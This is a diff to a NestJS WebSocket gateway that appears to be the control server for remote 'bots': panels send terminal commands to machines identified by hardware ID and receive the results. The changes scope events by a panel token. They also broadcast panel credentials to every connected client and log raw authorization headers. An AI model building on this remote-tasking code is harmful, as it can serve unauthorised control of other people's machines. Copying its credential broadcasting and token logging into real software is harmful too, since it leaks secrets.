@@ -47,8 +47,10 @@ export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnectio
   handleConnection(client: Socket, ...args: any[]) {
     this.logger.log(`Client connected: ${client.id}`);
     let peer = ''
+    let token = ''
     try {
       peer = client.handshake.headers.authorization.substring(0, 7)
+      token = client.handshake.headers.authorization.replace("###### ", '')
       this.logger.log(`Request token: ${client.handshake.headers.authorization}`);
       switch (peer) {
         case "###### ": {
@@ -65,6 +67,7 @@ export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnectio
               message: 'New panel has join!',
             }
             this.server.emit('panel_received_server_heartbeat', response);
+            this.server.emit(`${token}_panel_received_username`, this.panelGuard.getCreds(token));
           }
         break;
         }
@@ -148,13 +151,13 @@ export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnectio
         success: true,
         message: result.data['result'],
       }
-      this.server.emit(`panel_terminal_bot_task_result_${result.data['hwid']}`, response)
+      this.server.emit(`${result.data['panelToken']}_panel_terminal_bot_task_result_${result.data['hwid']}`, response)
     } else {
       const response: ResponseMessageDto = {
         success: false,
         message: "Server cannot manipulated task result",
       }
-      this.server.emit(`panel_terminal_bot_task_result_${result.data['hwid']}`, response)
+      this.server.emit(`${result.data['panelToken']}_panel_terminal_bot_task_result_${result.data['hwid']}`, response)
     }
   }
   
@@ -170,7 +173,12 @@ export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnectio
       data
     }
     this.logger.log(`response to panel_request_bot_data called: ${JSON.stringify(response)}`)
-    this.server.emit('panel_received_bot_data', response)
+    if(request.token){
+      this.server.emit(`${request.token}_panel_received_bot_data`, response)
+    }else{
+      this.server.emit(`all_panel_received_bot_data`, response)
+    }
+    
   }
 
   @UseGuards(PanelAuthGuard)
@@ -185,14 +193,14 @@ export class PattayaMessagesGateway implements OnGatewayInit, OnGatewayConnectio
         success: true,
         message: `Tasked bot ${request.hwid} with command ${request.command}`,
       }
-      this.server.to(client.id).emit(`server_ack_terminal_bot_task_result_${request.hwid}`, response)
+      this.server.emit(`${request.panelToken}_server_ack_terminal_bot_task_result_${request.hwid}`, response)
       this.server.to(request.socketId).emit('bot_receive_task', botTask)
     } else {
       const response: ResponseMessageDto = {
         success: false,
         message: `Failed to stamp bot task`,
       }
-      this.server.to(client.id).emit(`server_ack_terminal_bot_task_result_${request.hwid}`, response)
+      this.server.emit(`${request.panelToken}_server_ack_terminal_bot_task_result_${request.hwid}`, response)
  
     }
   }
